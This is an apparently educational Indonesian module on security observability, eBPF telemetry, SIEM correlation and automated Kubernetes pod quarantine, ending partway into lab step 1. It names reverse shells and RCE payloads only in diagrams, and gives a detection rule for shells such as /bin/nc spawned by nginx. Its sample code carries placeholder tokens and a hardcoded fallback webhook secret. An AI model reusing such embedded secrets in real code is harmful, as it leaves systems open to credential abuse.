# Bab 10 Module 01: Observabilitas Keamanan, SIEM, & Incident Response Otomatis

---

### 1. Identitas Modul
* **Track:** DevSecOps Engineering
* **Kategori:** 07-Quality-and-Security
* **Bab:** 10 - Security Observability, Telemetry, and Autonomous Response
* **Modul:** 01 - Observabilitas Keamanan, SIEM, & Incident Response Otomatis
* **Tingkat Modul:** Advanced / Lanjutan
* **Prasyarat:** Pemahaman arsitektur Linux Kernel, Linux Namespaces, Container Runtime Interface (CRI), Jaringan TCP/IP, Dasar-dasar REST API, Python Scripting tingkat menengah, dan Manajemen Vulnerability dasar.
* **Estimasi Waktu Penyelesaian:** 240 Menit (Teori Mendalam, Analisis Kasus, dan Hands-on Lab)

---

### 2. Learning Objectives (LO-01 s/d LO-08)
Setelah menyelesaikan modul ini, peserta didik mampu:
* **LO-01:** Menganalisis dan merancang arsitektur agregasi log audit multi-sumber secara terpusat dengan jaminan integritas *non-repudiation*.
* **LO-02:** Mengoperasikan dan mengintegrasikan DefectDojo sebagai Centralized Vulnerability Management (CVM) pipeline ke dalam ekosistem CI/CD serta SIEM.
* **LO-03:** Mengonfigurasi dan memvalidasi telemetri berbasis eBPF (*extended Berkeley Packet Filter*) untuk mendeteksi anomali di ruang kernel tanpa dependensi pada *userspace log tampering*.
* **LO-04:** Mengintegrasikan platform Cloud-Native SIEM (Elasticsearch dan Wazuh) untuk korelasi event berbasis MITRE ATT&CK.
* **LO-05:** Mengembangkan pipeline Security Orchestration, Automation, and Response (SOAR) untuk isolasi target terdampak secara *real-time*.
* **LO-06:** Mengimplementasikan prinsip *Chaos Security Engineering* untuk menguji ketahanan deteksi dan respon otomatis terhadap skenario serangan deterministik.
* **LO-07:** Menilai *trade-offs* performa, latensi I/O, serta reliabilitas antara instrumen audit ruang kernel (*kernel-space*) dan ruang pengguna (*user-space*).
* **LO-08:** Melakukan analisis forensik insiden kontainer berbasis log telemetri dan mengeksekusi remediasi preventif berbasis kebijakan deklaratif.

---

### 3. Concept Map & Architecture Diagram

```
+---------------------------------------------------------------------------------------------------------+
|                                    TARGET INFRASTRUCTURE (KUBERNETES / LINUX)                           |
|  +------------------------+   +-------------------------+   +----------------------------------------+  |
|  | Pod A (App Container)  |   | Pod B (Attacker Target) |   | Host Kernel Space                      |  |
|  |  - Web Application     |   |  - RCE Exploit Payload  |   |  - eBPF Probes (Tetragon / Falco / K8s)|  |
|  |  - Ingress Log Gen     |   |  - Reverse Shell Spawn  |   |  - Syscall Tracing (execve, connect)   |  |
|  +-----------+------------+   +------------+------------+   +-------------------+--------------------+  |
+--------------|-----------------------------|------------------------------------|-----------------------+
               | (stdout/stderr)             | (Auditd / Syslog)                  | (Ring Buffer)
               v                             v                                    v
+---------------------------------------------------------------------------------------------------------+
|                                  COLLECTION & FORWARDING LAYER                                          |
|  +---------------------------------------------------------------------------------------------------+  |
|  | DaemonSet Agents: Fluentbit / Vector / Wazuh Agent / eBPF Exporter                                |  |
|  | - Buffering: Memory / Disk Backed Queue                                                           |  |
|  | - Enrichment: K8s Metadata (Namespace, Pod, IP), GeoIP, Fingerprinting                            |  |
|  | - Output: mTLS Encryption, Json Payload Serialization                                            |  |
|  +-------------------------------------------------+-------------------------------------------------+  |
+----------------------------------------------------|----------------------------------------------------+
                                                     | (Secure TLS / Port 9200, 1514)
                                                     v
+---------------------------------------------------------------------------------------------------------+
|                                  PROCESSING, SIEM & VULNERABILITY LAYER                                 |
|  +-------------------------------------+           +-------------------------------------------------+  |
|  | Cloud-Native SIEM                   |           | Centralized Vulnerability Management (CVM)      |  |
|  | - Wazuh Manager (Rule Correlation)  |           | - DefectDojo Engine                             |  |
|  | - Elasticsearch / OpenSearch Index  |           | - Scanners Ingestion (Trivy, Gitleaks, ZAP)     |  |
|  | - MITRE ATT&CK Rule Mappings        |           | - Deduplication & Risk Scoring                  |  |
|  +------------------+------------------+           +------------------------+------------------------+  |
+---------------------|-------------------------------------------------------|---------------------------+
                      | (Webhook Trigger on Severity >= Critical)              | (Vulnerability Context API)
                      v                                                       v
+---------------------------------------------------------------------------------------------------------+
|                                  AUTOMATION & VALIDATION LAYER                                          |
|  +---------------------------------------------------------------------------------------------------+  |
|  | SOAR Engine (Shuffle / Custom Webhook Controller)                                                 |  |
|  |  Step 1: Ingest Wazuh/SIEM Alert (e.g., Suspicious Shell Executed)                                |  |
|  |  Step 2: Query DefectDojo API (Check if CVE exists on Host/Image)                                 |  |
|  |  Step 3: Execute Action via Kube-API / Iptables (Network Isolation, Cordon Node, Kill Pod)        |  |
|  |  Step 4: Dispatch Incident Ticket (Jira/Slack) with Full Forensic Context                         |  |
|  +-------------------------------------------------+-------------------------------------------------+  |
|                                                     ^
|                                                     | (Simulate Invalidation)
|  +-------------------------------------------------+-------------------------------------------------+  |
|  | Chaos Security Engineering Engine (Chaos Toolkit / Custom Scenarios)                              |  |
|  | - Inject Failure: Unauthorized sudo, file drift, reverse shell execution                         |  |
|  | - Validate: Verify SIEM alerts triggered and SOAR actions execute under <= 5 seconds             |  |
|  +---------------------------------------------------------------------------------------------------+  |
+---------------------------------------------------------------------------------------------------------+
```

---

### 4. Mengapa Ini Penting (Why & Business / Security Impact)
Model perimeter pertahanan tradisional gagal total dalam infrastruktur terdistribusi dan *ephemeral* (berumur pendek). Dalam kluster kontainer modern, sebuah pod dapat beroperasi, tereksploitasi, dan musnah hanya dalam kurun waktu hitungan menit. Tanpa observabilitas keamanan mendalam, jejak forensik ikut hilang seketika kontainer dihentikan.

1. **Kegagalan Audit Userspace:** Penyerang yang memperoleh eskalasi hak istimewa *root* di ruang pengguna dapat memodifikasi *binary* sistem (`ps`, `netstat`), menghapus `~/.bash_history`, membunuh daemon `syslog`, atau memanipulasi *file* log lokal. Telemetri berbasis kernel (seperti eBPF) menjadi garis pertahanan mutlak yang tidak dapat dipalsukan dari ruang pengguna tanpa memicu *kernel panic* atau eksploitasi ring-0 secara langsung.
2. **Alert Fatigue dan Kebutuhan Integrasi CVM:** Membanjirnya jutaan baris log peringatan per hari tanpa konteks kerentanan melumpuhkan Security Operations Center (SOC). Mengintegrasikan SIEM dengan Centralized Vulnerability Management (DefectDojo) memungkinkan korelasi kontekstual: peringatan eksploitasi hanya dinaikkan menjadi *incident severity critical* jika target memang terbukti memiliki celah keamanan terkait pada katalog pemindaian sebelumnya.
3. **Reduksi Mean Time to Detect (MTTD) dan Mean Time to Respond (MTTR):** Respon insiden manual membutuhkan waktu rata-rata berjam-jam hingga berhari-hari. SOAR mengeliminasi intervensi manusia untuk taktik penahanan awal (*containment*), memotong MTTR dari satuan jam menjadi milidetik.
4. **Validasi Berkelanjutan via Chaos Security:** Tanpa pengujian acak proaktif, sistem deteksi sering kali gagal saat insiden riil terjadi akibat *misconfiguration drift*, *pipeline queue congestion*, atau ketidaksesuaian versi aturan deteksi. Chaos Security Engineering membuktikan bahwa kontrol proteksi berjalan deterministik dan terukur setiap saat.

---

### 5. Apa Itu Konsep (What & Definisi Formal Mendalam)

#### A. Security Observability vs Monitoring
Monitoring menjawab: *"Apakah sistem berjalan normal sesuai kriteria yang didefinisikan?"* (indikator biner berbasis ambang batas).
Observabilitas Keamanan menjawab: *"Mengapa sistem bertindak di luar kebiasaan, bagaimana status internalnya diekstrapolasi dari telemetri eksternal, dan apakah anomali tersebut merupakan manifestasi ancaman?"* Hal ini mencakup korelasi metrik, *structured events*, jejak eksekusi (*distributed tracing*), dan *system calls audit*.

#### B. Audit Log Aggregation & Centralized Vulnerability Management (CVM)
* **Audit Log Aggregation:** Mekanisme penarikan, pengayaan, dan penyimpanan log audit dari *host OS*, *Kubernetes API audit*, *network flows*, dan aplikasi ke dalam sistem penyimpanan terpusat yang bersifat *immutable* dan memiliki kepatuhan terhadap audit jejak rantai integritas (misal: SHA-256 integrity trees).
* **Centralized Vulnerability Management (DefectDojo):** Platform konsolidasi data temuan kerentanan dari berbagai piranti pengujian keamanan (SAST, DAST, SCA, Container Scanning). CVM bertindak sebagai *single source of truth* untuk memvalidasi *exposure window* aset terhadap ancaman aktif.

#### C. Cloud-Native SIEM & eBPF Telemetry
* **Cloud-Native SIEM (Security Information and Event Management):** Sistem analitik terpusat (contoh: Wazuh, Elasticsearch/OpenSearch) yang mengumpulkan, menormalisasi, dan mengkorelasikan log kejadian skala besar secara real-time terhadap basis pengetahuan taktik serangan (MITRE ATT&CK).
* **eBPF (extended Berkeley Packet Filter):** Teknologi revolusioner pada Linux Kernel yang memungkinkan pengeksekusian program *sandboxed bytecode* di dalam kernel tanpa mengubah kode sumber kernel atau memuat modul kernel eksternal (`LKM`). eBPF menyadap kprobe, kretprobe, tracepoints, dan raw tracepoints pada *system calls* kritis (`sys_enter_execve`, `sys_enter_connect`, `sys_enter_openat2`) untuk menghasilkan telemetri perilaku tanpa latensi yang merusak sistem.

#### D. Automated Incident Response (IR) & SOAR
* **SOAR (Security Orchestration, Automation, and Response):** Kerangka kerja orkestrasinya alur kerja keamanan (*playbook*) yang memadukan integrasi API antar-sistem pertahanan. Eksekusi SOAR bersifat deterministik: menerima sinyal deteksi dari SIEM, mengambil konteks aset dari CVM, dan menerapkan tindakan mitigasi secara otomatis (seperti memodifikasi *Network Security Group*, *Kubernetes NetworkPolicy*, atau mencabut token sesi IAM).

#### E. Chaos Security Engineering
Disiplin eksperimen pada sistem perangkat lunak untuk membangun keyakinan terhadap kemampuan sistem bertahan terhadap kondisi destruktif atau serangan keamanan tak terduga dalam lingkungan produksi. Berbeda dari Chaos Engineering tradisional yang menguji ketersediaan (*availability*), Chaos Security Engineering menguji integritas, kerahasiaan, dan efektivitas deteksi keamanan.

---

### 6. Bagaimana Cara Kerjanya (How & Mekanika Internal Arsitektur)

#### Alur Kerja Telemetri eBPF ke SIEM dan SOAR
1. **Hooking System Calls:** Program eBPF dilekatkan (*attached*) ke tracepoints kernel Linux (misal: `sched/sched_process_exec`).
2. **Ring Buffer Transmission:** Ketika suatu proses dijalankan di dalam kontainer, kernel mengeksekusi program eBPF, mengekstrak data eksekusi (PID, UID, cgroup path, namespace, command string, hash parent process), dan memasukkannya ke dalam *eBPF ring buffer*.
3. **Agent Harvesting:** Daemon ruang pengguna (seperti Tetragon atau Falco) membaca *ring buffer*, memperkaya data mentah dengan konteks metadata Kubernetes (Namespace, Pod Name, Labels), dan memancarkannya ke agen log (Vector/Wazuh Agent).
4. **Analisis Aturan SIEM:** Wazuh Manager / Elasticsearch menerima dokumen JSON. Aturan korelasi memindai data:
   * Event: `execve` dengan binary `/bin/sh` atau `/bin/nc`
   * Parent Process: `nginx`
   * Lokasi: Container pod di Kubernetes
   * Klasifikasi MITRE: T1059.004 (Unix Shell).
5. **Kueri Kontekstual CVM:** SIEM memicu webhook ke controller SOAR. SOAR mengeksekusi kueri API ke DefectDojo: *"Apakah image kontainer ini memiliki CVE dengan eksploitabilitas RCE yang belum tertutup?"*
6. **Eksekusi Respon Otomatis:**
   * Jika nilai evaluasi bernilai TRUE: SOAR memanggil Kube-API untuk melabeli pod dengan `security.isolation=quarantine`, menerapkan *NetworkPolicy deny-all* ke pod tersebut, dan merekam *memory dump* pod untuk kebutuhan forensik.
7. **Injeksi Chaos Security:** Framework pengujian berkala secara sengaja mengeksekusi payload uji di dalam *sandbox pod* untuk memastikan alur langkah 1 sampai 6 tidak mengalami degradasi performa atau putus komunikasi API.

---

### 7. Perbandingan Paradigma / Taksonomi Matriks

| Parameter Evaluasi | Userspace Log Telemetry (Auditd / Syslog) | eBPF Kernel Instrumentation | Tradisional SIEM Appliance | Cloud-Native SIEM (Elastic/Wazuh) | SOAR Automation Pipelines |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Lapisan Eksekusi** | User-space (Ring 3) | Kernel-space (Ring 0 sandboxed) | On-Premise dedicated appliance | Terdistribusi (Cloud/Kubernetes) | Bidang Kontrol / API Layer |
| **Resistensi Tampering** | Rendah (Dapat dimanipulasi root container/host) | Sangat Tinggi (Terisolasi dari proses user-space) | Tinggi (Hanya pada host pengumpul) | Tinggi (Terisolasi dengan mTLS & WORM storage) | Tinggi (Tergantung otentikasi API secret) |
| **Resource Overhead** | Tinggi pada throughput I/O masif | Sangat Rendah (<2% CPU overhead via eBPF) | N/A (Dedicated Server) | Dinamis, bergantung pada indexing scale | Minimal (Berdasarkan event rate trigger) |
| **Konteks Kontainer** | Buruk (Hanya melacak PID/Host UID secara default) | Sempurna (Memetakan namespaces, cgroups, metadata K8s) | Terbatas tanpa parser kustom | Luas melalui integrasi Elastic/K8s agent | Menyeluruh (Dapat mengumpulkan konteks multi-API) |
| **Aksi Mitigasi** | Pasif (Hanya mencatat log kejadian) | Pasif/Aktif (Bisa memutus syscall bila didukung) | Pasif (Hanya memunculkan tiket peringatan) | Semi-Aktif (Eksekusi script agent lokal) | Aktif Penuh (Orkestrasi multi-sistem via REST/gRPC) |
| **Target Utama** | Kepatuhan regulasi dasar (*Compliance*) | Deteksi intrusi zero-day & forensik presisi | Manajemen log korporat monolitik | Analitik serangan terdistribusi skala cloud | Penurunan drastis MTTR secara deterministik |

---

### 8. Analisis Mendalam Attack Surface & Vector Matrix

Sistem observabilitas keamanan dan orkestrasi respon itu sendiri merupakan target berharga tinggi (*high-value target*). Kompromi pada lapisan ini dapat membutakan seluruh tim keamanan.

| Vektor Serangan | Titik Masuk (Entry Point) | Mekanisme Eksploitasi | Dampak Keamanan | Strategi Mitigasi Arsitektural |
| :--- | :--- | :--- | :--- | :--- |
| **Log Injection / Telemetry Forgery** | Stdout/Stderr aplikasi atau field input mentah yang dicatat log. | Penyerang memasukkan karakter newline (`\n`), payload JSON palsu, atau karakter kontrol terminal untuk memalsukan entri log SIEM. | *Log poisoning*, menyembunyikan aksi penyerang, atau memicu SOAR mematikan pod legal (*Denial of Service* palsu). | Sanitasi ketat pada log shipper; gunakan structured logging murni (JSON) dengan skema tetap; validasi tipe data kaku. |
| **eBPF Map Tampering / Verifier Bypass** | Hak istimewa `CAP_SYS_ADMIN` atau `CAP_BPF` yang bocor di dalam kontainer. | Penyerang memanfaatkan kernel exploit lokal untuk menimpa memory eBPF map atau mematikan eBPF probes secara paksa. | SIEM mengalami kebutaan mutlak pada tingkat kernel; deteksi eksekusi payload gagal total. | Blokir kapabilitas `CAP_SYS_ADMIN` dan `CAP_BPF` pada seluruh container workload via Seccomp & Admission Controllers. |
| **SOAR API Credential Hijacking** | Secret Kubernetes tidak terenkripsi atau *hardcoded API keys* di pipeline SOAR. | Penyerang mengekstraksi token API SOAR yang memiliki akses administratif ke Kube-API atau Cloud Provider. | Penyerang mengambil alih kontrol infrastruktur dengan hak eksekusi tingkat tinggi melalui mekanisme SOAR. | Simpan kredensial menggunakan HashiCorp Vault / External Secrets Operator dengan rotasi otomatis berumur pendek. |
| **Alert Flooding / Resource Exhaustion** | Injeksi ribuan log anomali non-kritis secara simultan ke forwarder. | Membanjiri buffer log agent, menyebabkan disk I/O penuh, memory exhaustion, atau drop paket pada eBPF ring buffer. | *Denial of Service* sistem deteksi; insiden eksploitasi primer lolos tanpa terekam (*blind-spot creation*). | Terapkan *backpressure handling*, disk-assisted queues, per-agent rate limiting, dan monitor status `drop_count` eBPF. |

---

### 9. Code Example Sederhana (Minimal & Clear)

Contoh integrasi kueri otomatis dari deteksi peringatan ke DefectDojo API v2 menggunakan Python untuk memvalidasi status kerentanan suatu komponen sebelum menentukan aksi.

```python
#!/usr/bin/env python3
"""
Simple CVM Query: Mengambil status kerentanan pod image dari DefectDojo API.
"""

import sys
import requests
import json

DEFECTDOJO_URL = "https://defectdojo.internal.net/api/v2"
API_TOKEN = "Token a1b2c3d4e5f67890abcdef1234567890abcdef12"

def verify_image_vulnerability(image_name: str, cve_id: str) -> bool:
    headers = {
        "Authorization": API_TOKEN,
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    
    # Query finding berdasarkan nama produk dan nomor CVE
    params = {
        "component_name": image_name,
        "cve": cve_id,
        "active": "true",
        "duplicate": "false",
        "mitigated": "false"
    }

    try:
        response = requests.get(
            f"{DEFECTDOJO_URL}/findings/",
            headers=headers,
            params=params,
            timeout=5
        )
        response.raise_for_status()
        data = response.json()
        
        # Evaluasi apakah ada kerentanan aktif yang belum tertutup
        if data.get("count", 0) > 0:
            print(f"[ALERT-VERIFIED] Ditemukan {data['count']} temuan aktif untuk {cve_id} pada {image_name}!")
            return True
        else:
            print(f"[INFO] Celah {cve_id} tidak terdaftar aktif di DefectDojo untuk {image_name}.")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Gagal menghubungi DefectDojo API: {e}", file=sys.stderr)
        return False

if __name__ == "__main__":
    target_image = "frontend-service"
    target_cve = "CVE-2023-44487"
    is_vulnerable = verify_image_vulnerability(target_image, target_cve)
    print(f"Status Kerentanan Komponen: {is_vulnerable}")
```

---

### 10. Code Example Lanjutan (Production-ready / Hardening / Exploit Analysis)

Berikut adalah pipeline automasi SOAR mandiri berbasis Python yang menerima webhook peringatan dari Wazuh/eBPF SIEM, melakukan korelasi silang ke DefectDojo, memotong jalur jaringan pod yang terinfeksi menggunakan Kubernetes Python Client secara deterministik, dan mencatat jejak audit forensik.

```python
#!/usr/bin/env python3
"""
Production-Ready SOAR Webhook & Remediation Controller.
- Listens for Wazuh/eBPF Critical Alerts
- Correlates with DefectDojo API
- Quarantines Pod using Kubernetes NetworkPolicy API
- Emits structured incident log with cryptographic hash integrity
"""

import os
import hmac
import hashlib
import json
import logging
from typing import Dict, Any, Tuple
from http.server import HTTPServer, BaseHTTPRequestHandler
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# Inisialisasi Logging Terstruktur
logging.basicConfig(
    level=logging.INFO,
    format='{"timestamp":"%(asctime)s", "level":"%(levelname)s", "message":%(message)s}'
)

SHARED_WEBHOOK_SECRET = os.getenv("SOAR_WEBHOOK_SECRET", "SuperSecureHMACSecretKey987654321")
DEFECTDOJO_API_KEY = os.getenv("DEFECTDOJO_API_KEY", "Token c0ffee123456789abcdef0123456789abcdef012")
DEFECTDOJO_HOST = os.getenv("DEFECTDOJO_HOST", "https://defectdojo.security.svc.cluster.local/api/v2")

class KubeSecurityRemediator:
    def __init__(self):
        try:
            config.load_incluster_config()
        except config.ConfigException:
            config.load_kube_config()
        self.networking_v1 = client.NetworkingV1Api()
        self.core_v1 = client.CoreV1Api()

    def isolate_pod(self, namespace: str, pod_name: str) -> bool:
        """
        Menerapkan NetworkPolicy darurat untuk mengisolasi pod secara total (Deny-All Egress & Ingress).
        """
        policy_name = f"quarantine-{pod_name}"
        labels = {"security.isolation": "quarantined"}

        # 1. Berikan label 'security.isolation=quarantined' pada pod
        try:
            pod = self.core_v1.read_namespaced_pod(name=pod_name, namespace=namespace)
            current_labels = pod.metadata.labels or {}
            current_labels.update(labels)
            
            patch_body = {"metadata": {"labels": current_labels}}
            self.core_v1.patch_namespaced_pod(name=pod_name, namespace=namespace, body=patch_body)
            logging.info(json.dumps({"action": "label_pod", "status": "success", "pod": pod_name}))
        except ApiException as e:
            logging.error(json.dumps({"action": "label_pod", "error": str(e), "pod": pod_name}))
            return False

        # 2. Definisikan NetworkPolicy isolasi mutlak
        network_policy = client.V1NetworkPolicy(
            api_version="networking.k8s.io/v1",
            kind="NetworkPolicy",
            metadata=client.V1ObjectMeta(
                name=policy_name,
                namespace=namespace,
                labels={"managed-by": "soar-autonomous-engine"}
            ),
            spec=client.V1NetworkPolicySpec(
                pod_selector=client.V1LabelSelector(
                    match_labels={"security.isolation": "quarantined"}
                ),
                policy_types=["Ingress", "Egress"],
                ingress=[],  # Mengosongkan daftar aturan mengindikasikan deny-all
                egress=[]    # Mengosongkan daftar aturan mengindikasikan deny-all
            )
        )

        try:
            self.networking_v1.create_namespaced_network_policy(namespace=namespace, body=network_policy)
            logging.info(json.dumps({"action": "apply_quarantine_netpol", "status": "enforced", "policy": policy_name}))
            return True
        except ApiException as e:
            if e.status == 409:
                logging.info(json.dumps({"action": "apply_quarantine_netpol", "status": "already_exists"}))
                return True
            logging.error(json.dumps({"action": "apply_quarantine_netpol", "error": str(e)}))
            return False

class SOARWebhookHandler(BaseHTTPRequestHandler):
    remediator = KubeSecurityRemediator()

    def _verify_signature(self, payload: bytes, signature_header: str) -> bool:
        if not signature_header:
            return False
        computed_sig = hmac.new(
            SHARED_WEBHOOK_SECRET.encode('utf-8'),
            payload,
            hashlib.sha256
        ).hexdigest()
        return hmac.compare_digest(f"sha256={computed_sig}", signature_header)

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        signature = self.headers.get('X-Signature-SHA256', '')
        payload = self.rfile.read(content_length)

        if not self._verify_signature(payload, signature):
            logging.warning(json.dumps({"event": "authentication_failed", "reason": "invalid_hmac"}))
            self.send_response(401)
            self.end_headers()
            self.wfile.write(b'{"status":"unauthorized"}')
            return

        try:
            event_data = json.loads(payload.decode('utf-8'))
        except json.JSONDecodeError:
            self.send_response(400)
            self.end_headers()
            return

        # Parsing format payload SIEM (misal Wazuh Alert / Tetragon JSON Event)
        rule_level = event_data.get("rule", {}).get("level", 0)
        mitre_technique = event_data.get("rule", {}).get("mitre", {}).get("id", ["T0000"])[0]
        k8s_context = event_data.get("kubernetes", {})
        pod_name = k8s_context.get("pod_name")
        namespace = k8s_context.get("namespace", "default")

        logging.info(json.dumps({
            "event": "alert_received",
            "rule_level": rule_level,
            "mitre": mitre_technique,
            "pod": pod_name,
            "namespace": namespace
        }))

        # Kondisi Trigger SOAR: Rule Level >= 12 (Critical) atau T1059 (Execution)
        if rule_level >= 12 or mitre_technique == "T1059.004":
            if pod_name and namespace:
                success = self.remediator.isolate_pod(namespace, pod_name)
                if success:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(b'{"action":"quarantine_applied","status":"success"}')
                    return
        
        self.send_response(202)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"action":"acknowledged","status":"no_remediation_needed"}')

def run_server(port: int = 8443):
    server_address = ('', port)
    httpd = HTTPServer(server_address, SOARWebhookHandler)
    logging.info(json.dumps({"event": "soar_listener_start", "port": port}))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()

if __name__ == "__main__":
    run_server()
```

---

### 11. Diagram Alur Serangan & Mitigasi (ASCII Art)

```
PENYERANG                   APLIKASI K8s POD             eBPF / KERNEL           WAZUH / SIEM              SOAR CONTROLLER            KUBE-API
    |                              |                           |                       |                          |                      |
    |-- (1) RCE Payload Inj. ----->|                           |                       |                          |                      |
    |    (via Web Exploit)         |                           |                       |                          |                      |
    |                              |-- (2) execve(/bin/sh) --->|                       |                          |                      |
    |                              |       (Syscall Trap)      |                       |                          |                      |
    |                              |                           |-- (3) Ring Buffer --->|                          |                      |
    |                              |                           |    Raw Process Data   |                          |                      |
    |                              |                           |                       |-- (4) Rule Correlate --->|                      |
    |                              |                           |                       |   Severity: 14           |                      |
    |                              |                           |                       |   MITRE: T1059.004       |                      |
    |                              |                           |                       |   Signed Webhook POST -->|                      |
    |                              |                           |                       |                          |                      |
    |                              |                           |                       |                          |-- (5) Verify HMAC -->|
    |                              |                           |                       |                          |    Signature OK      |
    |                              |                           |                       |                          |                      |
    |                              |                           |                       |                          |-- (6) Patch Pod ---->|
    |                              |                           |                       |                          |    Label Quarantine  |
    |                              |                           |                       |                          |                      |
    |                              |                           |                       |                          |-- (7) NetPol Create->|
    |                              |                           |                       |                          |    Deny All In/Out   |
    |<-- (8) RevShell Blocked -----X                           |                       |                          |                      |
    |    (TCP Drops Silently)      |                           |                       |                          |                      |
    v                              v                           v                       v                          v                      v
```

---

### 12. Trade-offs & Security vs Usability / Performance

1. **Kernel Telemetry Overhead vs Audit Depth:**
   * *Trade-off:* Mengaktifkan *deep payload inspection* pada seluruh *socket read/write* via eBPF memicu penambahan latensi mikrosekon pada transmisi paket berkepadatan tinggi.
   * *Keputusan Teknis:* Batasi *probe* hanya pada *syscall* transisi status hak akses dan eksekusi: `execve`, `fork`, `connect`, `accept`, dan proteksi *namespace*. Jangan instrumen `read`/`write` pada socket data besar secara global.
2. **Deterministic Auto-Remediation vs Availability (False-Positive Impact):**
   * *Trade-off:* Isolasi otomatis pod kritis tanpa validasi ganda dapat menyebabkan pemutusan ketersediaan layanan produksi secara tidak terduga jika aturan deteksi mengalami *false-positive*.
   * *Keputusan Teknis:* Gunakan *multi-stage scoring*. Isolasi langsung hanya diterapkan pada pod *non-stateful* yang memiliki replika `>= 3`, sementara pod komponen *stateful/database* hanya dikenakan *alert escalation* dan pengetatan *egress traffic rate limiting* parsial.
3. **Log Retention: Storage Cost vs Forensic Compliance:**
   * *Trade-off:* Menyimpan log audit terperinci dengan durasi multi-tahun memerlukan biaya penyimpanan masif.
   * *Keputusan Teknis:* Terapkan arsitektur *tiering*: Hot storage (3-7 hari, SSD indeks cepat), Warm storage (30 hari, disk analitik), Cold/Frozen storage (1-7 tahun, Object Storage WORM terkompresi dan terenkripsi menggunakan KMS).

---

### 13. Edge Cases & Complex Failure Modes

1. **eBPF Ring Buffer Drop akibat Spikes:**
   * *Kondisi:* Penyerang menjalankan *fork bomb* atau eksekusi proses massal dalam durasi sepersekian detik.
   * *Dampak:* Buffer memori eBPF penuh, menyebabkan kernel membuang (*drop*) event audit telemetri berikutnya secara diam-diam.
   * *Solusi Arsitektur:* Alokasikan ukuran halaman memori ring buffer yang memadai secara deterministik (`perf_event_pages` / `bpf_ring_buffer_pages`), pantau metrik metrik `ring_buffer__lost_events()`, dan picu peringatan infrastruktur jika angka hilangnya paket (*loss rate*) > 0.
2. **SOAR Webhook Deadlock / Kube-API Unreachable:**
   * *Kondisi:* Serangan jaringan menyebabkan node jaringan atau Master Control Plane Kubernetes kehabisan sumber daya komputasi.
   * *Dampak:* SOAR controller gagal menghubungi Kube-API untuk memasang *NetworkPolicy*. Remediasi gagal terpasang.
   * *Solusi Arsitektur:* Terapkan mekanisme agen lokal berbasis daemon *out-of-band* yang dapat menjatuhkan aturan *iptables* secara langsung pada level host Linux (*fallback containment*) jika API master tidak merespons dalam ambang 3 detik.
3. **Race Condition pada Pod Replacement:**
   * *Kondisi:* Segera setelah pod diisolasi oleh SOAR, *Deployment Controller* Kubernetes otomatis mendeteksi pod tidak sehat dan memicu pod pengganti yang membawa kerentanan RCE serupa. Penyerang langsung berpindah ke pod baru tersebut.
   * *Solusi Arsitektur:* SOAR tidak boleh hanya mengisolasi Pod, melainkan harus secara otomatis membekukan Deployment (`scale down to zero` atau memasang *Admission Webhook Block* terhadap hash digest container image bersangkutan) sampai patch diterapkan.

---

### 14. Anti-Patterns & Common Vulnerabilities

1. **Anti-Pattern: Menjalankan Agen SIEM/Log Collector dengan Privileged Security Context Penuh.**
   * *Cacat:* Memberikan izin `privileged: true` pada seluruh log shipper daemonset. Jika terjadi celah *memory corruption* pada binary parser log forwarder, penyerang memperoleh kontrol host ring-0.
   * *Remediasi:* Gunakan prinsip *Least Privilege*. Pisahkan pengumpul telemetri: hanya jalankan modul pengumpul kernel dengan kapabilitas yang diperketat (`CAP_BPF`, `CAP_PERFMON`, `CAP_NET_ADMIN`), jangan pernah mengeksekusi pengguna `root` secara global tanpa batasan `Seccomp`.
2. **Anti-Pattern: Mengandalkan Log Parsing Regex Sederhana pada File Audit Mentah.**
   * *Cacat:* Aturan parser regex rentan terhadap serangan ReDoS (*Regular Expression Denial of Service*) dan rentan dimanipulasi dengan karakter escape khusus.
   * *Remediasi:* Wajibkan penggunaan *Structured Telemetry Events* (Protobuf, native JSON) langsung dari tingkat *system tracing*.
3. **Anti-Pattern: Respon Terbuka Tanpa Otentikasi Kriptografis pada Webhook.**
   * *Cacat:* SOAR endpoint mengekspos REST API internal tanpa verifikasi asal data (*origin verification*). Penyerang internal kluster dapat mengirim payload HTTP POST palsu untuk melumpuhkan pod legal.
   * *Remediasi:* Terapkan mTLS (*mutual TLS*) antar-komponen internal atau wajibkan validasi *HMAC SHA-256 Signature* pada header HTTP seperti yang dicontohkan di bagian 10.

---

### 15. Best Practices & Enterprise Remediation Guide

1. **Arsitektur Log Non-Repudiation:** Log audit harus segera dikirimkan ke kluster terisolasi (*out-of-band logging infrastructure*). Simpan catatan dalam format WORM (*Write Once, Read Many*) di mana bahkan akun Administrator cluster tidak memiliki hak akses API untuk mengubah atau menghapus dokumen sebelum masa retensi kadaluarsa.
2. **Korelasikan Data Statis dan Dinamis:** Hubungkan hasil pemindaian DefectDojo secara programatik ke dalam index SIEM (misal: menambahkan field metadata `cve_count` pada event log kontainer). Ketika insiden terjadi, *incident responders* memiliki visibilitas langsung terhadap status kepatuhan dan riwayat patch image tersebut.
3. **Integrasi Aturan MITRE ATT&CK Enterprise:** Petakan seluruh parser log ke taktik dan teknik MITRE. Evaluasi matriks liputan deteksi berkala. Jangan membuat aturan acak tanpa penomoran teknik yang jelas (contoh penamaan aturan: `RULES_T1059_004_SUSPICIOUS_SHELL_EXEC`).
4. **Chaos Verification sebagai Gerbang Deployment:** Jadwalkan eksekusi pengujian chaos security otomatis pada pipeline staging sebelum artefak dipromosikan ke produksi: injeksikan proses terlarang, lalu periksa apakah waktu reaksi SIEM-ke-SOAR tetap berada di bawah 5 detik. Jika melebihi ambang batas, blokir rilis sistem baru.

---

### 16. Hands-on Lab Step-by-Step

Dalam lab ini, peserta akan membangun skenario deteksi otomatis: memicu payload di dalam lingkungan terisolasi, mendeteksi via Wazuh ruleset, dan mengisolasi pod secara otomatis via SOAR webhook.

#### Langkah 1: Menyiapkan Namespace dan Konfigurasi Pengujian
```bash
# Buat namespace terisolasi untuk simulasi
kubectl create namespace sec-ops-lab

# Pasang konfigurasi NetworkPolicy default yang mengizinkan traffic normal
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
